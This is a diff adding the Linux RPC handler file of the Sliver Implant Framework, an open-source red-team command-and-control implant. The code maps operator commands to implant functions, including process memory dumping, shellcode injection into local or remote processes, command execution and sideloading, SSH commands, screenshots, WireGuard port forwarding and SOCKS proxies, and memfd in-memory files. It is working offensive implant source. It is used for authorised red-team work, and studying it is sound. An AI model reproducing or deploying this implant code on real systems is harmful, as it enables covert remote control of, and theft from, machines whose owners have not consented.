@@ -1,0 +1,320 @@
+package handlers
+
+/*
+	Sliver Implant Framework
+	Copyright (C) 2019  Bishop Fox
+
+	This program is free software: you can redistribute it and/or modify
+	it under the terms of the GNU General Public License as published by
+	the Free Software Foundation, either version 3 of the License, or
+	(at your option) any later version.
+
+	This program is distributed in the hope that it will be useful,
+	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	GNU General Public License for more details.
+
+	You should have received a copy of the GNU General Public License
+	along with this program.  If not, see <https://www.gnu.org/licenses/>.
+*/
+
+import (
+	"fmt"
+	"os"
+	"os/user"
+	"strconv"
+	"strings"
+	"syscall"
+	"time"
+
+	"github.com/bishopfox/sliver/implant/sliver/extension"
+	"github.com/bishopfox/sliver/implant/sliver/mount"
+	"github.com/bishopfox/sliver/implant/sliver/procdump"
+	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
+	"github.com/bishopfox/sliver/protobuf/commonpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"golang.org/x/sys/unix"
+	"google.golang.org/protobuf/proto"
+
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
+)
+
+var (
+	linuxHandlers = map[uint32]RPCHandler{
+		sliverpb.MsgPsReq:              psHandler,
+		sliverpb.MsgTerminateReq:       terminateHandler,
+		sliverpb.MsgPing:               pingHandler,
+		sliverpb.MsgLsReq:              dirListHandler,
+		sliverpb.MsgDownloadReq:        downloadHandler,
+		sliverpb.MsgUploadReq:          uploadHandler,
+		sliverpb.MsgCdReq:              cdHandler,
+		sliverpb.MsgPwdReq:             pwdHandler,
+		sliverpb.MsgRmReq:              rmHandler,
+		sliverpb.MsgMkdirReq:           mkdirHandler,
+		sliverpb.MsgMvReq:              mvHandler,
+		sliverpb.MsgCpReq:              cpHandler,
+		sliverpb.MsgTaskReq:            taskHandler,
+		sliverpb.MsgIfconfigReq:        ifconfigLinuxHandler,
+		sliverpb.MsgExecuteReq:         executeHandler,
+		sliverpb.MsgExecuteChildrenReq: executeChildrenHandler,
+		sliverpb.MsgEnvReq:             getEnvHandler,
+		sliverpb.MsgSetEnvReq:          setEnvHandler,
+		sliverpb.MsgUnsetEnvReq:        unsetEnvHandler,
+
+		sliverpb.MsgScreenshotReq: screenshotHandler,
+
+		sliverpb.MsgNetstatReq:  netstatHandler,
+		sliverpb.MsgSideloadReq: sideloadHandler,
+
+		sliverpb.MsgReconfigureReq: reconfigureHandler,
+		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
+		sliverpb.MsgProcessDumpReq: dumpHandler,
+		sliverpb.MsgMountReq:       mountHandler,
+		sliverpb.MsgGrepReq:        grepHandler,
+
+		// Extensions
+		sliverpb.MsgRegisterExtensionReq: registerExtensionHandler,
+		sliverpb.MsgCallExtensionReq:     callExtensionHandler,
+		sliverpb.MsgListExtensionsReq:    listExtensionsHandler,
+
+		// Wasm Extensions - Note that execution can be done via a tunnel handler
+		sliverpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
+		sliverpb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
+		sliverpb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,
+
+		// {{if .Config.IncludeWG}}
+		// Wireguard specific
+		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
+		sliverpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
+		sliverpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
+		sliverpb.MsgWGStartSocksReq:     wgStartSocksHandler,
+		sliverpb.MsgWGStopSocksReq:      wgStopSocksHandler,
+		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
+		// {{end}}
+
+		// Unix permissions
+		sliverpb.MsgChmodReq:   chmodHandler,
+		sliverpb.MsgChownReq:   chownHandler,
+		sliverpb.MsgChtimesReq: chtimesHandler,
+
+		// Linux Only
+		sliverpb.MsgMemfilesListReq: memfilesListHandler,
+		sliverpb.MsgMemfilesAddReq:  memfilesAddHandler,
+		sliverpb.MsgMemfilesRmReq:   memfilesRmHandler,
+	}
+)
+
+// GetSystemHandlers - Returns a map of the linux system handlers
+func GetSystemHandlers() map[uint32]RPCHandler {
+	return linuxHandlers
+}
+
+func newExtension(data []byte, id string, arch string, init string) extension.Extension {
+	return extension.NewLinuxExtension(data, id, arch, init)
+}
+
+func dumpHandler(data []byte, resp RPCResponse) {
+	procDumpReq := &sliverpb.ProcessDumpReq{}
+	err := proto.Unmarshal(data, procDumpReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	res, err := procdump.DumpProcess(procDumpReq.Pid)
+	dumpResp := &sliverpb.ProcessDump{Data: res.Data()}
+	if err != nil {
+		dumpResp.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
+	}
+	data, err = proto.Marshal(dumpResp)
+	resp(data, err)
+}
+
+func mountHandler(data []byte, resp RPCResponse) {
+	mountReq := &sliverpb.MountReq{}
+	err := proto.Unmarshal(data, mountReq)
+	if err != nil {
+		return
+	}
+
+	mountData, err := mount.GetMountInformation()
+	mountResp := &sliverpb.Mount{
+		Info:     mountData,
+		Response: &commonpb.Response{},
+	}
+
+	if err != nil {
+		mountResp.Response.Err = err.Error()
+	}
+
+	data, err = proto.Marshal(mountResp)
+	resp(data, err)
+}
+
+func taskHandler(data []byte, resp RPCResponse) {
+	var err error
+	task := &sliverpb.TaskReq{}
+	err = proto.Unmarshal(data, task)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	if task.Pid == 0 {
+		err = taskrunner.LocalTask(task.Data, task.RWXPages)
+	} else {
+		err = taskrunner.RemoteTask(int(task.Pid), task.Data, task.RWXPages)
+	}
+	resp([]byte{}, err)
+}
+
+func getUid(fileInfo os.FileInfo) string {
+	uid := int32(fileInfo.Sys().(*syscall.Stat_t).Uid)
+	uid_str := strconv.FormatUint(uint64(uid), 10)
+	usr, err := user.LookupId(uid_str)
+	if err != nil {
+		return ""
+	}
+	return usr.Name
+}
+
+func getGid(fileInfo os.FileInfo) string {
+	gid := int32(fileInfo.Sys().(*syscall.Stat_t).Gid)
+	gid_str := strconv.FormatUint(uint64(gid), 10)
+	grp, err := user.LookupGroupId(gid_str)
+	if err != nil {
+		return ""
+	}
+	return grp.Name
+}
+
+func memfilesListHandler(_ []byte, resp RPCResponse) {
+
+	pid := os.Getpid()
+	path := fmt.Sprintf("/proc/%d/fd/", pid)
+	dir, rootDirEntry, files, err := getDirList(path)
+
+	// Convert directory listing to protobuf
+	timezone, offset := time.Now().Zone()
+	dirList := &sliverpb.Ls{Path: dir, Timezone: timezone, TimezoneOffset: int32(offset)}
+	if err == nil {
+		dirList.Exists = true
+	} else {
+		dirList.Exists = false
+	}
+	dirList.Files = []*sliverpb.FileInfo{}
+	rootDirInfo, err := rootDirEntry.Info()
+	if err == nil {
+		// We should not get an error because we created the DirEntry object from the FileInfo object
+		dirList.Files = append(dirList.Files, &sliverpb.FileInfo{
+			Name:    ".", // Cannot use the name from the FileInfo / DirEntry because that is the name of the directory
+			Size:    rootDirInfo.Size(),
+			ModTime: rootDirInfo.ModTime().Unix(),
+			Mode:    rootDirInfo.Mode().String(),
+			Uid:     getUid(rootDirInfo),
+			Gid:     getGid(rootDirInfo),
+			IsDir:   rootDirInfo.IsDir(),
+		})
+	}
+
+	for _, dirEntry := range files {
+		//log.Printf("File: %s\n", dirEntry.Name())
+		dirEntry.Name()
+
+		fileInfo, err := dirEntry.Info()
+		sliverFileInfo := &sliverpb.FileInfo{}
+		if err == nil {
+
+			sliverFileInfo.Size = fileInfo.Size()
+			sliverFileInfo.ModTime = fileInfo.ModTime().Unix()
+			sliverFileInfo.Mode = fileInfo.Mode().String()
+			// Check if this is a symlink, and if so, add the path the link points to
+			if fileInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
+
+				link_str, err := os.Readlink(path + dirEntry.Name())
+				if err == nil && strings.Contains(link_str, "/memfd:") {
+
+					sliverFileInfo.Uid = getUid(fileInfo)
+					sliverFileInfo.Gid = getGid(fileInfo)
+					sliverFileInfo.Name = dirEntry.Name()
+					sliverFileInfo.IsDir = dirEntry.IsDir()
+					sliverFileInfo.Link = link_str
+
+					dirList.Files = append(dirList.Files, sliverFileInfo)
+				}
+			}
+		}
+	}
+
+	// Send back the response
+	data, err := proto.Marshal(dirList)
+	resp(data, err)
+}
+
+func memfilesAddHandler(_ []byte, resp RPCResponse) {
+	memfilesAdd := &sliverpb.MemfilesAdd{Response: &commonpb.Response{}}
+
+	memfdName := taskrunner.RandomString(8)
+	fd, err := unix.MemfdCreate(memfdName, unix.MFD_CLOEXEC)
+	if err != nil {
+		//{{if .Config.Debug}}
+		log.Printf("Error creating memfd: %s\n", err)
+		//{{end}}
+		memfilesAdd.Response.Err = err.Error()
+	} else {
+		memfilesAdd.Fd = int64(fd)
+	}
+
+	data, err := proto.Marshal(memfilesAdd)
+	if err != nil && fd >= 0 {
+		_ = unix.Close(fd)
+	}
+	resp(data, err)
+}
+
+func memfilesRmHandler(data []byte, resp RPCResponse) {
+
+	memfilesRmReq := &sliverpb.MemfilesRmReq{}
+	err := proto.Unmarshal(data, memfilesRmReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	memfilesRm := &sliverpb.MemfilesRm{}
+	memfilesRm.Fd = memfilesRmReq.Fd
+	memfilesRm.Response = &commonpb.Response{}
+
+	pid := os.Getpid()
+	fdPath := fmt.Sprintf("/proc/%d/fd/%d", pid, memfilesRmReq.Fd)
+	fileInfo, err := os.Lstat(fdPath)
+
+	if err == nil {
+
+		if fileInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
+			link_str, err := os.Readlink(fdPath)
+			if err == nil && strings.Contains(link_str, "/memfd:") {
+				syscall.Close(int(memfilesRmReq.Fd))
+			} else {
+				memfilesRm.Response.Err = "file descriptor does not represent a memfd"
+			}
+		} else {
+			memfilesRm.Response.Err = "file descriptor does not represent a symlink"
+		}
+	} else {
+		memfilesRm.Response.Err = err.Error()
+	}
+
+	data, err = proto.Marshal(memfilesRm)
+	resp(data, err)
+
+}
